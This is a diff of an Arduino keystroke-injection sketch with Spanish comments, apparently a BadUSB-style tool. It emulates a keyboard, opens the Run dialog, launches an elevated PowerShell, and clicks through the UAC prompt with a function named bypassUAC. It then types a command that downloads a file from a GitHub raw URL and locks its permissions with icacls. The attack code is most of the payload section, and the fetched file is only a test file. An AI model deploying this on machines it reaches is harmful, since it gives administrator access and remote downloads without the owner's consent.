@@ -1,7 +1,7 @@
 #include <Keyboard.h>
 
 
-#define DELAY_MULT 12
+#define DELAY_MULT 20
 
 
 // Keyboard.h tiene problemas entendiendo otros layouts
@@ -9,18 +9,20 @@
 void pressShiftedKey(char key) {
   Keyboard.press(KEY_LEFT_SHIFT);
   Keyboard.press(key);
-  Keyboard.releaseAll();
+  delay(DELAY_MULT);
+  Keyboard.release(key);
+  Keyboard.release(KEY_LEFT_SHIFT);
   delay(DELAY_MULT);
 }
 
-// Lo mismo con AltGr
 void pressGrKey(char key) {
   Keyboard.press(KEY_RIGHT_ALT);
   Keyboard.press(key);
-  Keyboard.releaseAll();
+  delay(DELAY_MULT);
+  Keyboard.release(key);
+  Keyboard.release(KEY_RIGHT_ALT);
   delay(DELAY_MULT);
 }
-
 
 // Esta funcion enmascara pressShiftedKey y pressGrKey mediante muchos
 // casos en un switch de forma que se le pueda pasar el caracter que quieres
@@ -33,7 +35,7 @@ void pressGrKey(char key) {
 char mapSpanishToUS(char c) {
     switch (c) {
 
-    // Shift y AltGr de los Numeros
+    // Shift y AltGr de los Números
     case '!': pressShiftedKey('1'); break;
     case '"': pressShiftedKey('2'); break;
     case '·': pressShiftedKey('3'); break;
@@ -44,32 +46,32 @@ char mapSpanishToUS(char c) {
     case '(': pressShiftedKey('8'); break;
     case ')': pressShiftedKey('9'); break;
     case '=': pressShiftedKey('0'); break;
-    case '|': pressGrKey('1'); break;
-    case '@': pressGrKey('2'); break;
-    case '~': pressGrKey('4'); break;
-    case '€': pressGrKey('5'); break;
-    case '¬': pressGrKey('6'); break;
+    
+    // AltGr combinaciones específicas del español
+    case '|': pressGrKey('1'); break; // AltGr+1
+    case '@': pressGrKey('2'); break; // AltGr+2
+    case '#': pressGrKey('3'); break; // AltGr+3
+    case '~': pressGrKey('4'); break; // AltGr+4
+    case '€': pressGrKey('5'); break; // AltGr+5
+    case '¬': pressGrKey('6'); break; // AltGr+6
+    case '{': pressGrKey('\''); break; // AltGr+´
+    case '}': pressGrKey('+'); break; // AltGr+ç
+    case '\\': pressGrKey('`'); break; // AltGr+º
 
-    // Caracteres especiales
-	// Quedan muchos que cuento con no utilizar
-    case ';': pressShiftedKey(','); break; 
-    case ':': pressShiftedKey('.'); break; 
-    case '-': Keyboard.write('/'); break;  
-    case '_': pressShiftedKey('/'); break; 
+    // Caracteres especiales directos
+    case ';': pressShiftedKey(','); break;
+    case ':': pressShiftedKey('.'); break;
+    case '-': Keyboard.write('/'); break;
+    case '_': pressShiftedKey('/'); break;
 
-    case '{': pressGrKey('\''); break; 
-    case '}': pressGrKey('\\'); break;
-
-    // Espacio y otros basicos que a veces no funcionan
+    // Espacio y otros básicos que a veces no funcionan
     case ' ': Keyboard.write(' '); break;
     case '\n': Keyboard.write(KEY_RETURN); break;
-
 
     // Fall-back
     default: Keyboard.write(c); break;
   }
 }
-
 
 // EL metodo print de Keyboard.h funciona bastante irregular.
 // Se salta caracteres, algunos los duplica, etc, etc...
@@ -91,13 +93,13 @@ void printString(String string){
 // Presiona flecha izquierda y enter
 // Vuelve a esperar un poco que a veces tarda bastante en quitarse
 void bypassUAC(){
-  delay(DELAY_MULT * 120);
+  delay(DELAY_MULT * 125);
   Keyboard.press(KEY_LEFT_ARROW);
-  Keyboard.releaseAll();
+  Keyboard.release(KEY_LEFT_ARROW);
   delay(DELAY_MULT);
   Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(DELAY_MULT * 10);
+  Keyboard.release(KEY_RETURN);
+  delay(DELAY_MULT * 50);
 }
 
 // Abre la ventana de Ejecución de Comandos rapida mediante Win+R
@@ -111,14 +113,14 @@ void runCommand(String command){
   printString(command);
   delay(DELAY_MULT * 5);
   Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(DELAY_MULT * 40);
+  Keyboard.release(KEY_RETURN);
+  delay(DELAY_MULT * 50);
 }
 
 // funcion principal (main)
 void setup() {
   Keyboard.begin(); // Contructor
-  delay(DELAY_MULT * 60); // Delay para que se configure como dispositivo HID
+  delay(DELAY_MULT * 75); // Delay para que se configure como dispositivo HID
   // Igual hay que hacerlo fijo y no relatio al multiplier pero
   // hasta que de problemas para probar mas lento se va a quedar así
 
@@ -130,8 +132,15 @@ void setup() {
   runCommand("powershell Start-Process powershell -Verb runAs");
   bypassUAC();
 
-  // Prueba 3: Descargar fichero con permisos de administrador (deberia salir UAC para borrar)
-  printString("wget https://raw.githubusercontent.com/germanquero/arduGator/refs/heads/main/arduGator.ino");
+	
+
+  // Prueba 3: Cd a Desktop y Descargar fichero con permisos de administrador
+  printString("cd ~/Desktop");
+  Keyboard.press(KEY_RETURN);
+  delay(DELAY_MULT);
+  Keyboard.release(KEY_RETURN);
+  delay(DELAY_MULT);
+  printString("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/germanquero/arduGator/refs/heads/main/testing.txt\" -OutFile \".\\testing.txt\"; icacls \".\\testing.txt\" /inheritance:r /grant:r \"Administradores:F\" /deny \"Usuarios:(DE,DC)\"");
 
   // ---
   // todo:
